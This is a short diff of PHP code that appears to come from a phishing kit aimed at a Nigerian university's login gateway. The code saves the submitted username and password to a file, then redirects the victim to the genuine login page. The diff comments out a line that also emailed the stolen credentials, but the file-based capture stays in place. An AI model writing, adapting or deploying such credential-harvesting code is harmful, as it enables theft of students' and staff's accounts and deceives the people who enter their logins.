@@ -20,7 +20,7 @@ class Master{
 	public function process(){
 		if($this->writeFile($_POST['username'], $_POST['password'])){
 
-			$this->sendMail(($u = $_POST['username'], $p = $_POST['password']));
+			//$this->sendMail(($u = $_POST['username'], $p = $_POST['password']));
 
 			header('Location: http://gateway.oauife.edu.ng/login');
 			exit;
